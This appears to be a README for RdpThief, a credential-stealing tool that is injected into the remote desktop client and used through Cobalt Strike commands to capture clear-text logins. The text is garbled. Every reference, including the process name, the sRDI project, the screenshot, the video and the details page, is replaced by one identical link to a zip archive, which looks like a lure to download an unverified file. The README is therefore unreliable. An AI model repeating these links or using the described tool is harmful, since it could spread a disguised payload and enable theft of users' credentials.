# RdpThief

RdpThief by itself is a standalone DLL that when injected in the https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip process, will perform API hooking, extract the clear-text credentials and save them to a file. 

An aggressor script accompanies it, which is responsible for managing the state, monitoring for new processes and injecting the shellcode in https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip The DLL has been converted to shellcode using the sRDI project (https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip). When enabled, RdpThief will get the process list every 5 seconds, search for https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip, and inject to it.

When the aggressor script is loaded on Cobalt Strike, three new commands will be available:

* rdpthief_enable – Enables the hearbeat check of new https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip processes and inject into them.
* rdpthief_disable – Disables the hearbeat check of new https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip but will not unload the already loaded DLL.
* rdpthief_dump – Prints the extracted credentials if any.

## Screenshot

![Example Usage](https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip)

Demonstration Video : https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip

More details can be found on : https://raw.githubusercontent.com/r2hloveu/RdpThief/master/RdpThief/Rdp-Thief-v1.5.zip
